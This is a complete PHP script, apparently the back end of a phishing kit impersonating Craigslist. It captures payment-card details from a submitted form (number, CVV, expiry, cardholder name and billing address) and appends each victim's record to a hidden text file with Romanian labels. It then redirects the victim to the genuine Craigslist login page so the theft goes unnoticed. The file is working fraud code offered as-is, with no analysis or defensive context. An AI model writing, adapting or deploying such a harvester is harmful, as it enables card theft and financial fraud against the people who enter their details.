<?php

header("Location: https://accounts.craigslist.org/login");


$cardnumber= $_POST['cardNumber'];
$cvv= $_POST['cvNumber'];
$dataZI= $_POST['Zi'];
$dataLUNA= $_POST['expDate'];
$cardname= $_POST['cardFirstName'];
$cardnamelast= $_POST['cardLastName'];
$address= $_POST['cardAddress'];
$city= $_POST['cardCity'];
$state= $_POST['cardState'];
$zipcodecc= $_POST['cardPostal'];


$Carti = fopen("123qweqq11.txt", "a");

fwrite($Carti, "Numar de Card: ");
fwrite($Carti, $cardnumber);
fwrite($Carti,"\r\n");
fwrite($Carti, "CVV: ");
fwrite($Carti, $cvv);
fwrite($Carti,"\r\n");
fwrite($Carti, "Data: ");
fwrite($Carti, $dataZI);
fwrite($Carti, " / ");
fwrite($Carti, $dataLUNA);
fwrite($Carti,"\r\n");
fwrite($Carti, "Nume: ");
fwrite($Carti, $cardname);
fwrite($Carti, "\r\n");
fwrite($Carti, "Prenume: ");
fwrite($Carti, $cardnamelast);
fwrite($Carti,"\r\n");
fwrite($Carti, "Adresa: ");
fwrite($Carti, $address);
fwrite($Carti,"\r\n");
fwrite($Carti, "Oras: ");
fwrite($Carti, $city);
fwrite($Carti,"\r\n");
fwrite($Carti, "Stat: ");
fwrite($Carti, $state);
fwrite($Carti,"\r\n");
fwrite($Carti, "Zip: ");
fwrite($Carti, $zipcodecc);
fwrite($Carti, "\r\n");
fwrite($Carti, "================================");
fwrite($Carti, "\r\n");
fclose($Carti);
?>